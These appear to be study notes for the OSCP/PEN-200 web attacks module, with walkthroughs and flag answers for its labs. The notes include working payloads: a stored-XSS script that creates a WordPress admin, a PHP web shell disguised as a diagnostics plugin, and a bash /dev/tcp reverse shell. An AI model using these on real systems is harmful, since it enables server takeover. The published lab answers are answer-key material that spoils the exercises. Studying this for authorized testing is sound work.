# OSCP / PEN-200 — Introduction to Web Application Attacks

> GitHub-ready study notes based on the PEN-200 Web Application Attacks module.  
> Focus: **concept → enumeration → exploitation workflow → lab-solving process → final answer**.

---

## Table of Contents

1. [Web Application Assessment Methodology](#1-web-application-assessment-methodology)
2. [Web Application Assessment Tools](#2-web-application-assessment-tools)
3. [Web Application Enumeration](#3-web-application-enumeration)
4. [Cross-Site Scripting](#4-cross-site-scripting)
5. [Capstone: WordPress Admin → Web Shell → Reverse Shell](#5-capstone-wordpress-admin--web-shell--reverse-shell)
6. [All Labs — How to Solve + Answers](#6-all-labs--how-to-solve--answers)
7. [Quick Command Reference](#7-quick-command-reference)
8. [Key Takeaways](#8-key-takeaways)

---

# 1. Web Application Assessment Methodology

## White-box

You have broad access to:

- Source code
- Infrastructure
- Architecture/design documentation
- Internal application logic

Typical work:

- Source-code review
- Authentication/authorization review
- Business-logic review
- Manual code tracing

## Black-box

You start with little or no internal information.

```text
Enumerate
  ↓
Identify technologies
  ↓
Map application surface
  ↓
Discover parameters / routes / APIs
  ↓
Test behavior
  ↓
Exploit validated weaknesses
```

## Grey-box

You receive limited information such as:

- Credentials
- Partial documentation
- Known framework
- Limited architecture details

### OSCP takeaway

For black-box testing, **enumeration quality matters heavily** because you do not begin with source code or internal documentation.

---

# 2. Web Application Assessment Tools

The core tools in this unit are:

```text
Nmap
Wappalyzer
Gobuster
Burp Suite
curl
Browser Developer Tools
```

---

## 2.1 Nmap Web Fingerprinting

Identify server/version:

```bash
sudo nmap -p80 -sV TARGET
```

Example:

```text
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

Enumerate web paths:

```bash
sudo nmap -p80 --script=http-enum TARGET
```

Possible findings:

```text
/login.php
/db/
/css/
/images/
/js/
/uploads/
```

### What to do next

Every discovered path becomes a manual-enumeration target:

```bash
curl -i http://TARGET/login.php
curl -i http://TARGET/uploads/
```

---

## 2.2 Technology Stack Identification

Useful:

```bash
whatweb http://TARGET
```

or use Wappalyzer.

Look for:

```text
Web server
CMS
Backend language
Frontend framework
JavaScript libraries
CDN/proxy
Version information
```

---

## 2.3 Directory Brute Force with Gobuster

Basic:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

Lower thread count:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
-t 5
```

With extensions:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
-x php,txt,html
```

### Important status codes

```text
200 = OK
301 = Permanent redirect
302 = Temporary redirect
401 = Authentication required
403 = Resource exists but forbidden
404 = Not found
405 = Method not allowed
500 = Server-side error
```

### Wildcard/catch-all response problem

If Gobuster says random paths receive the same response:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
--exclude-length 0
```

---

## 2.4 Burp Suite Basics

Launch:

```bash
burpsuite
```

Default proxy:

```text
127.0.0.1:8080
```

Useful components:

```text
Proxy
HTTP History
Repeater
Intruder
Target / Site map
```

### Repeater workflow

```text
Capture request
  ↓
Send to Repeater
  ↓
Modify request
  ↓
Send again
  ↓
Compare response
```

### Intruder workflow

```text
Capture login POST
  ↓
Send to Intruder
  ↓
Clear automatic payload markers
  ↓
Mark only the target value
  ↓
Load payload list
  ↓
Start attack
  ↓
Compare status / length / redirect
```

---

# 3. Web Application Enumeration

Important areas:

```text
Application structure
Routes
Static resources
Headers
Cookies
Forms
JavaScript
Hidden fields
APIs
Authentication
Authorization
```

---

## 3.1 Debugging Page Content

Firefox Developer Tools:

```text
Inspector
Debugger
Network
Storage
Console
```

### Inspect HTML

```bash
curl -s http://TARGET/ > index.html
```

Search:

```bash
grep -Ein 'flag|OS\{|<!--|script|stylesheet|hidden' index.html
```

Find linked files:

```bash
grep -Eo '(href|src)="[^"]+\.(css|js)[^"]*"' index.html
```

---

## HTML / CSS / JavaScript challenge pattern

```text
HTML → part 1
CSS  → part 2
JS   → part 3
```

Search:

```bash
grep -Ein 'flag|part|OS\{|secret' \
index.html style.css script.js
```

### JavaScript Base64

```javascript
atob("SGVsbG8=")
```

If a function is defined:

```javascript
displayFlag9232()
```

run it from:

```text
F12 → Console
```

---

## 3.2 Headers, robots.txt, and Sitemaps

Headers:

```bash
curl -I http://TARGET
```

Full response:

```bash
curl -i http://TARGET
```

Look for:

```text
Server
X-Powered-By
Location
Set-Cookie
Custom X-* headers
```

Base64 decode:

```bash
echo 'BASE64_VALUE' | base64 -d
```

robots.txt:

```bash
curl http://TARGET/robots.txt
```

sitemap:

```bash
curl http://TARGET/sitemap.xml
```

### Important

`robots.txt` and `sitemap.xml` are useful for discovering:

- Hidden routes
- Administrative pages
- Old pages
- API paths
- Unlinked content

---

## 3.3 API Enumeration and Abuse

Typical API pattern:

```text
/users/v1
/books/v1
/items/v1
/orders/v1
```

Create Gobuster pattern:

```bash
cat > pattern << EOF
{GOBUSTER}/v1
{GOBUSTER}/v2
EOF
```

Run:

```bash
gobuster dir \
-u http://TARGET:5002 \
-w /usr/share/wordlists/dirb/big.txt \
-p pattern
```

Query API:

```bash
curl -i http://TARGET:5002/users/v1
```

Nested property discovery:

```bash
gobuster dir \
-u http://TARGET:5002/users/v1/admin/ \
-w /usr/share/wordlists/dirb/small.txt
```

### Important clue

```text
404 = resource not found
405 = endpoint exists, wrong HTTP method
```

A `405` is often a strong sign to test:

```text
POST
PUT
PATCH
DELETE
```

---

## JSON POST

```bash
curl \
-d '{"password":"fake","username":"admin"}' \
-H 'Content-Type: application/json' \
http://TARGET:5002/users/v1/login
```

If the response says:

```text
Password is not correct for the given username.
```

you learned:

- Endpoint exists
- Request syntax is accepted
- Username is likely valid

---

## Business-Logic Testing

Example user registration body:

```json
{
  "username":"offsec",
  "password":"lab",
  "email":"pwn@offsec.com",
  "admin":"True"
}
```

If the application accepts a client-supplied privilege flag, that is a serious authorization/business-logic flaw.

---

## JWT / Authorization Header

Successful login may return a JWT.

Use it:

```bash
-H 'Authorization: OAuth TOKEN'
```

Example PUT:

```bash
curl -X PUT \
'http://TARGET:5002/users/v1/admin/password' \
-H 'Content-Type: application/json' \
-H 'Authorization: OAuth TOKEN' \
-d '{"password":"pwned"}'
```

---

# 4. Cross-Site Scripting

XSS occurs when attacker-controlled input is rendered as executable browser content.

Types:

```text
Stored
Reflected
DOM-based
```

---

## 4.1 Stored XSS

```text
Payload
  ↓
Stored in DB/cache
  ↓
Victim loads vulnerable page
  ↓
Payload executes
```

Common places:

```text
Comments
Reviews
Profiles
Visitor logs
Messages
```

---

## Reflected XSS

```text
Attacker-controlled request
  ↓
Application reflects value
  ↓
Browser executes it
```

Common locations:

```text
Search
Errors
Query parameters
```

---

## DOM XSS

Client-side JavaScript inserts attacker-controlled data into the DOM unsafely.

---

## 4.2 JavaScript Refresher

```javascript
function multiplyValues(x, y) {
    return x * y;
}

let a = multiplyValues(3, 5);
console.log(a);
```

### `eval()`

Interprets a string as JavaScript code and executes it:

```javascript
eval("alert(1)")
```

### `String.fromCharCode()`

```javascript
String.fromCharCode(72,101,108,108,111)
```

Result:

```text
Hello
```

---

## 4.3 Identifying XSS

Useful special characters:

```text
< > ' " { } ;
```

If these survive unsanitized in a dangerous HTML/JS context, investigate further.

HTML encoding example:

```text
< → &lt;
```

URL encoding example:

```text
space → %20
```

---

## 4.4 Visitors Plugin Stored XSS

Relevant values:

```php
'patch'     => $_SERVER["REQUEST_URI"],
'useragent' => $_SERVER['HTTP_USER_AGENT'],
'ip'        => $_SERVER['HTTP_X_FORWARDED_FOR']
```

Flow:

```text
User-controlled header
  ↓
Stored in DB
  ↓
Admin opens Visitors page
  ↓
Value printed into HTML
  ↓
JavaScript executes
```

Test payload:

```html
<script>alert(42)</script>
```

Send using User-Agent:

```bash
curl -i http://offsecwp \
--user-agent '<script>alert(42)</script>'
```

Other similar vulnerable header from the source:

```text
X-Forwarded-For
```

---

## 4.5 Privilege Escalation via XSS

A stored XSS running in an administrator's browser can perform authenticated actions.

Potential chain:

```text
Stored XSS
  ↓
Admin loads page
  ↓
Injected JavaScript runs in admin session
  ↓
Retrieve WordPress nonce
  ↓
Submit authenticated user-creation request
  ↓
Create secondary administrator
```

### WordPress nonce retrieval

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";

ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();

var nonceRegex = /ser" value="([^"]*?)"/g;
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

### Create new administrator

```javascript
var params =
"action=createuser" +
"&_wpnonce_create-user=" + nonce +
"&user_login=attacker" +
"&email=attacker@offsec.com" +
"&pass1=attackerpass" +
"&pass2=attackerpass" +
"&role=administrator";
```

### Encode JavaScript

```javascript
function encode_to_javascript(string) {
    var input = string;
    var output = '';

    for (pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);

        if (pos != input.length - 1) {
            output += ",";
        }
    }

    return output;
}
```

Rebuild and execute:

```javascript
eval(String.fromCharCode(...))
```

---

# 5. Capstone: WordPress Admin → Web Shell → Reverse Shell

Attack chain:

```text
Stored XSS
  ↓
Create secondary WordPress admin
  ↓
Login
  ↓
Upload malicious WordPress plugin
  ↓
PHP web shell
  ↓
Command execution
  ↓
Reverse shell
  ↓
Read /tmp/flag
```

Minimal plugin:

```php
<?php
/*
Plugin Name: OSCP Diagnostics
Description: Diagnostic plugin
Version: 1.0
*/

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Package:

```bash
zip -r oscp-shell.zip oscp-shell/
```

Test:

```bash
curl \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=id"
```

Expected style:

```text
uid=33(www-data) gid=33(www-data)
```

Enumerate:

```bash
curl -G \
--data-urlencode 'cmd=whoami; hostname; uname -a; pwd; id; ls -la /tmp' \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php"
```

Listener:

```bash
nc -lvnp 4444
```

Find VPN IP:

```bash
ip addr show tun0
```

Trigger reverse shell:

```bash
curl -G \
--data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'" \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php"
```

Then:

```bash
ls -la /tmp
cat /tmp/flag
```

---

# 6. All Labs — How to Solve + Answers

This section is intentionally detailed. Each lab includes:

```text
What the question asks
How to solve it
What to inspect
How to derive the answer
Final answer
```

---

# 6.1 Web Application Assessment Tools Labs

## Lab 1 — Four-Digit SMS Verification Code

### Question

Which Burp tool is most suited to brute-force a four-digit SMS verification keyspace?

### What the question is testing

You need a Burp feature that can:

- Repeatedly send the same request
- Modify one parameter
- Try many candidate values automatically

### Process

1. Capture the SMS verification request.
2. Send it to Burp Intruder.
3. Mark the verification-code parameter as the payload position.
4. Generate values:

```text
0000
0001
0002
...
9999
```

5. Compare responses for success.

### Answer

```text
Intruder
```

---

## Lab 2 — Gobuster Redirect Status

### Question

When performing directory/file brute force with Gobuster, what HTTP response code represents redirection?

### Process

Gobuster output commonly shows:

```text
/css       (Status: 301)
/images    (Status: 301)
/uploads   (Status: 301)
```

A directory without a trailing slash is often redirected to the slash version.

### Answer

```text
301
```

---

## Lab 3 — Default Burp Proxy Port

### Question

What is the default port Burp Proxy listens on?

### Process

Burp:

```text
Proxy → Proxy settings / Listeners
```

Default:

```text
127.0.0.1:8080
```

### Answer

```text
8080
```

---

## Lab 4 — DIRTBUSTER Hidden Admin Portal

### Question

Find the hidden admin portal on Module Exercise VM #1, then log in with provided credentials and retrieve the flag.

### What the question is testing

Directory brute force.

### Process

1. Start the VM.
2. Browse the root site.
3. Run:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

4. If the server gives wildcard redirects:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
--exclude-length 0
```

5. If needed, include PHP files:

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt \
-x php \
--exclude-length 0
```

6. Open the interesting portal/path.
7. Use the credentials supplied by the Training Library.
8. Log in and retrieve the displayed flag.

### Important

The exact flag value was **not preserved in the supplied module extract/chat notes**, so do not invent it.

### Answer

```text
OS{LAB-SPECIFIC-FLAG}
```

---

## Lab 5 — DIRTBUSTER Password List

### Question

Username is:

```text
admin
```

Potential passwords are available at:

```text
http://TARGET/passwords.txt
```

Find the valid password and log in.

### Step 1 — Download passwords

```bash
wget http://TARGET/passwords.txt -O passwords.txt
```

### Step 2 — Inspect form

```bash
curl -s http://TARGET/ |
grep -E 'form|input|name=|action='
```

The lab form revealed:

```html
<form action="login.php" method="POST">
<input name="username">
<input name="password">
<input type="hidden" name="debug" value="0">
```

Therefore:

```text
POST /login.php
username=...
password=...
debug=0
```

### Step 3 — Find failure response

```bash
curl -i -s -X POST \
-d 'username=admin&password=wrong123&debug=0' \
http://TARGET/login.php
```

Response:

```text
Login Failed!
```

### Step 4 — Hydra

```bash
hydra -l admin -P passwords.txt TARGET http-post-form \
"/login.php:username=^USER^&password=^PASS^&debug=0:F=Login Failed!"
```

### Alternative — Response-length comparison

```bash
while read -r p; do
    result=$(curl -s -o /tmp/out \
      -w "%{http_code} %{size_download} %{redirect_url}" \
      -X POST \
      -d "username=admin&password=$p&debug=0" \
      http://TARGET/login.php)

    printf "%-20s %s\n" "$p" "$result"
done < passwords.txt
```

Most failures returned:

```text
200 100
```

One candidate returned:

```text
200 76
```

The differing entry corresponded to:

```text
zeddemore
```

### Credential Found

```text
admin:zeddemore
```

### Final flag

The actual `OS{...}` value after login was not preserved in the supplied notes.

---

# 6.2 Web Application Enumeration Labs

## Lab 1 — WordPress HTML Source Flag

### Question

Explore the `offsecwp` WordPress site and inspect its HTML source to find the flag.

### Process

1. Add the dynamically assigned IP to `/etc/hosts`:

```text
TARGET_IP offsecwp
```

2. Browse:

```text
http://offsecwp
```

3. Inspect page source with Developer Tools, or:

```bash
curl -s http://offsecwp/ > source.html
```

4. Search:

```bash
grep -Ein 'OS\{|flag|<!--' source.html
```

5. Explore the full site if necessary because the flag may appear in source that is not visible in the rendered page.

### Answer

```text
OS{ced03de56334ca809a140488ac656fc4}
```

---

## Lab 2 — Discover Another API and Find Admin's Item

### Question

Known API:

```text
/users/v1
```

Discover another API following the same pattern, then query its base path and identify the item belonging to `admin`.

### Step 1 — Query known API

```bash
curl http://TARGET:5002/users/v1
```

Example:

```json
{
  "users": [
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```

### Step 2 — Create pattern

```bash
cat > pattern << EOF
{GOBUSTER}/v1
EOF
```

### Step 3 — Brute-force API names

```bash
gobuster dir \
-u http://TARGET:5002 \
-w /usr/share/wordlists/dirb/big.txt \
-p pattern
```

Discovery:

```text
/books/v1
/users/v1
```

### Step 4 — Query `/books/v1`

```bash
curl http://TARGET:5002/books/v1
```

Response contains:

```json
{
  "book_title": "bookTitle22",
  "user": "admin"
}
```

### Answer

If the grader wants the item name:

```text
bookTitle22
```

The module recorded the object as:

```json
{
  "book_title": "bookTitle22",
  "user": "admin"
}
```

---

## Lab 3 — "Follow the Maps"

### Question

A website is dedicated to maps. Follow the maps to obtain the flag.

### What the question is hinting at

The Web Application Enumeration section discusses **sitemaps**.

### Process

Start by checking:

```bash
curl http://TARGET/sitemap.xml
```

Also check:

```bash
curl http://TARGET/robots.txt
```

Follow any paths referenced by the sitemap.

If multiple sitemap files are linked, continue following them until the flag-containing endpoint/page is found.

### Answer

```text
OS{4d143d6781611abc798e3e95322b807c}
```

---

## Lab 4 — Interesting URL-Level Information

### Question

Inspect Exercise VM #2's web application URL and notice anything interesting at the URL level.

### What the question is testing

URL inspection before using scanners.

Look at:

```text
Path
Filename
Extension
Query string
Parameters
Fragments
Encoded values
```

### Process

1. Browse the site.
2. Carefully inspect the full URL in the address bar.
3. If there is a parameter/value, test whether it contains recognizable encoding or a flag.
4. View the URL without relying on rendered page content.

Useful terminal check:

```bash
curl -i 'http://TARGET/<observed-path>'
```

### Answer

```text
OS{eef0f488f9506f03b930d99e8fbbde17}
```

> The supplied course extract confirms the answer, but does not preserve the exact URL that exposed it.

---

## Lab 5 — Non-Standard HTTP Header

### Question

The site produces strange/non-standard responses. Inspect HTTP headers.

### Process

Run:

```bash
curl -I http://TARGET
```

The lab returned a custom header similar to:

```text
X-Something-Non-Standard: VGhlIGZsYWcgaXM6IE9Te...
```

The value looks Base64-encoded.

Decode:

```bash
echo 'VGhlIGZsYWcgaXM6IE9Te...' | base64 -d
```

Decoded result:

```text
The flag is: OS{...}
```

### Answer

```text
OS{b717052b0be42feb680b33cc0b0ed88a}
```

---

## Lab 6 — HTML, CSS, JavaScript Flag

### Question

Closely inspect the three web amigos:

```text
HTML
CSS
JavaScript
```

### Step 1 — HTML

```bash
curl -s http://TARGET/ > index.html
```

Search:

```bash
grep -Ein 'flag|part|OS\{|<!--' index.html
```

The HTML contained:

```text
Here is part 1 of 3 of your flag:
OS{7b675cc78...
```

### Step 2 — Identify CSS and JS

```bash
grep -Eo '(href|src)="[^"]+\.(css|js)[^"]*"' index.html
```

Download them.

### Step 3 — Search CSS

```bash
grep -Ein 'flag|part|OS\{|/\*' *.css
```

### Step 4 — Search JavaScript

```bash
grep -Ein 'flag|part|OS\{|atob|function' *.js
```

The JavaScript defined a function and nested Base64 decoding.

Instead of manually decoding every layer:

```text
F12 → Console
```

Run the discovered function:

```javascript
displayFlag9232()
```

### Step 5 — Join all three pieces

```text
HTML part + CSS part + JS part
```

### Answer

```text
OS{7b675cc78f09e4a8fd7e6bf02291ad98}
```

---

# 6.3 Cross-Site Scripting Labs

## Lab 1 — Other Vulnerable Header

### Question

The Visitors plugin is vulnerable through the User-Agent. Which other HTTP header appears vulnerable from the source?

### Relevant source

```php
'useragent' => $_SERVER['HTTP_USER_AGENT'],
'ip'        => $_SERVER['HTTP_X_FORWARDED_FOR']
```

### Reasoning

Both values are attacker-controlled HTTP request metadata.

If both are stored and later rendered without correct output encoding, both may become XSS vectors.

PHP key:

```text
HTTP_X_FORWARDED_FOR
```

Corresponding HTTP header:

```text
X-Forwarded-For
```

### Answer

The grader accepted:

```text
X-Forwarded-For:
```

---

## Lab 2 — JavaScript Method That Executes a String

### Question

What JavaScript method interprets a string as code and executes it?

### Relevant code pattern

```javascript
eval(String.fromCharCode(...))
```

`String.fromCharCode()` reconstructs a string.

`eval()` executes the reconstructed JavaScript.

### Answer

```text
eval()
```

---

## Lab 3 — Capstone: XSS → Admin → Plugin → Reverse Shell

### Goal

1. Create a secondary WordPress administrator.
2. Upload a plugin containing a web shell.
3. Enumerate the target.
4. Upgrade to a reverse shell.
5. Read the flag from `/tmp`.

### Step 1 — Gain Administrator Access

Use the stored XSS privilege-escalation method from the learning unit to create another administrator account.

### Step 2 — Create Plugin

```bash
mkdir oscp-shell
cd oscp-shell
nano oscp-shell.php
```

Contents:

```php
<?php
/*
Plugin Name: OSCP Diagnostics
Description: Diagnostic plugin
Version: 1.0
*/

if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

Package:

```bash
cd ..
zip -r oscp-shell.zip oscp-shell/
```

### Step 3 — Upload

WordPress:

```text
Plugins
→ Add New
→ Upload Plugin
→ Install
→ Activate
```

### Step 4 — Verify Web Shell

```bash
curl \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=id"
```

Successful response:

```text
uid=33(www-data) gid=33(www-data)
```

### Step 5 — Enumerate

```bash
curl -G \
--data-urlencode 'cmd=whoami; hostname; uname -a; pwd; id; ls -la /tmp' \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php"
```

### Step 6 — Start Listener

```bash
nc -lvnp 4444
```

### Step 7 — Get Kali VPN IP

```bash
ip addr show tun0
```

### Step 8 — Trigger Reverse Shell

```bash
curl -G \
--data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'" \
"http://offsecwp/wp-content/plugins/oscp-shell/oscp-shell.php"
```

### Step 9 — Confirm Shell

```bash
whoami
id
hostname
```

### Step 10 — Find Flag

```bash
ls -la /tmp
```

The lab showed:

```text
/tmp/flag
```

Read:

```bash
cat /tmp/flag
```

### Answer

```text
OS{e830989fd79152975161031d62957451}
```

---

# 7. Quick Command Reference

## Web Fingerprinting

```bash
sudo nmap -p80 -sV TARGET
sudo nmap -p80 --script=http-enum TARGET
whatweb http://TARGET
```

## Gobuster

```bash
gobuster dir \
-u http://TARGET \
-w /usr/share/wordlists/dirb/common.txt
```

## Headers

```bash
curl -I http://TARGET
curl -i http://TARGET
```

## Source

```bash
curl -s http://TARGET/
```

## robots.txt / Sitemap

```bash
curl http://TARGET/robots.txt
curl http://TARGET/sitemap.xml
```

## API

```bash
curl -i http://TARGET:5002/users/v1
```

JSON POST:

```bash
curl \
-d '{"username":"admin","password":"fake"}' \
-H 'Content-Type: application/json' \
http://TARGET:5002/users/v1/login
```

PUT:

```bash
curl -X PUT \
-H 'Content-Type: application/json' \
-d '{"password":"newpass"}' \
http://TARGET/path
```

## Base64

```bash
echo 'BASE64' | base64 -d
```

## XSS Header Test

```bash
curl -i http://TARGET \
--user-agent '<script>alert(42)</script>'
```

## Web Shell

```bash
curl \
"http://TARGET/wp-content/plugins/oscp-shell/oscp-shell.php?cmd=id"
```

## Reverse Shell Listener

```bash
nc -lvnp 4444
```

---

# 8. Key Takeaways

## Enumerate Before Exploiting

Understand:

```text
Technology
Routes
Directories
Headers
Source
Forms
APIs
Authentication
Authorization
```

## HTTP Status Codes Are Clues

```text
200 → accessible
301/302 → redirect
401 → authentication required
403 → exists but forbidden
404 → not found
405 → endpoint exists, wrong method
500 → server error
```

## Compare Responses

Authentication testing should compare:

```text
Status
Length
Redirect
Cookies
Body
Timing
```

## API Testing Is More Than Endpoint Discovery

Test:

```text
GET
POST
PUT
PATCH
DELETE
Required properties
Unexpected properties
Privilege fields
Authentication
Authorization
```

## Source Review Matters

Inspect:

```text
HTML
CSS
JavaScript
Comments
Hidden fields
Routes
Hardcoded values
```

## Stored XSS Can Become Privilege Escalation

```text
Stored XSS
  ↓
Admin executes payload
  ↓
Retrieve nonce
  ↓
Authenticated action
  ↓
Create administrator
  ↓
Upload plugin
  ↓
Server command execution
```

## Final OSCP Web Mindset

```text
Port open
  ↓
Identify server/version
  ↓
Enumerate directories
  ↓
Inspect source + headers
  ↓
Map forms / parameters / APIs
  ↓
Understand response behavior
  ↓
Test input handling
  ↓
Exploit validated weaknesses
  ↓
Document evidence
```

---

## Disclaimer

Use these techniques only on systems you own or are explicitly authorized to test, including PEN-200/OSCP labs, CTFs, and approved penetration-testing scopes.
